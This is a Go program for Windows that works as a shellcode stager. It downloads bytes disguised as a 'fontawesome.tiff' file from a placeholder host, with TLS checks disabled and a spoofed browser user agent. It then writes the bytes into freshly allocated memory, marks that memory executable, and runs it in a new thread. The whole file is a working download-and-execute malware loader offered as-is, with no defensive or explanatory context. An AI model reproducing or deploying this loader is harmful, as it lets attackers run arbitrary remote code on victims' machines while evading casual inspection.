package main

import (
	"crypto/tls"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

func main() {
	domain := "___TARGET___"
	url := fmt.Sprintf("http://%s/fontawesome.tiff", domain)
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: tr}

	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		fmt.Fprintf(os.Stderr, "Shoot: %v\n", err)
		os.Exit(1)
	}

	userAgent := "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.3"
	req.Header.Set("User-Agent", userAgent)

	resp, err := client.Do(req)
	if err != nil {
		fmt.Fprintf(os.Stderr, "Shoot: %v\n", err)
		os.Exit(1)
	}
	defer resp.Body.Close()

	sc, err := io.ReadAll(resp.Body)
	if err != nil {
		fmt.Fprintf(os.Stderr, "Shoot: %v\n", err)
		os.Exit(1)
	}

	//fmt.Println("[+] Allocating memory for shellcode")
	addr, err := windows.VirtualAlloc(uintptr(0), uintptr(len(sc)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if err != nil {
		log.Fatalf("[FATAL] VirtualAlloc Failed: %v\n", err)
	}
	//fmt.Printf("[+] Allocated Memory Address: 0x%x\n", addr)

	modntdll := syscall.NewLazyDLL("Ntdll.dll")
	procrtlMoveMemory := modntdll.NewProc("RtlMoveMemory")

	procrtlMoveMemory.Call(addr, uintptr(unsafe.Pointer(&sc[0])), uintptr(len(sc)))
	//fmt.Println("[+] Wrote shellcode bytes to destination address")

	//fmt.Println("[+] Changing Permissions to RX")
	var oldProtect uint32
	err = windows.VirtualProtect(addr, uintptr(len(sc)), windows.PAGE_EXECUTE_READ, &oldProtect)

	if err != nil {
		log.Fatalf("[FATAL] VirtualProtect Failed: %v", err)
	}

	modKernel32 := syscall.NewLazyDLL("kernel32.dll")
	procCreateThread := modKernel32.NewProc("CreateThread")
	tHandle, _, lastErr := procCreateThread.Call(
		uintptr(0),
		uintptr(0),
		addr,
		uintptr(0),
		uintptr(0),
		uintptr(0))

	if tHandle == 0 {
		log.Fatalf("Unable to Create Thread: %v\n", lastErr)
	}

	//fmt.Printf("[+] Handle of newly created thread:  %x \n", tHandle)
	windows.WaitForSingleObject(windows.Handle(tHandle), windows.INFINITE)
}
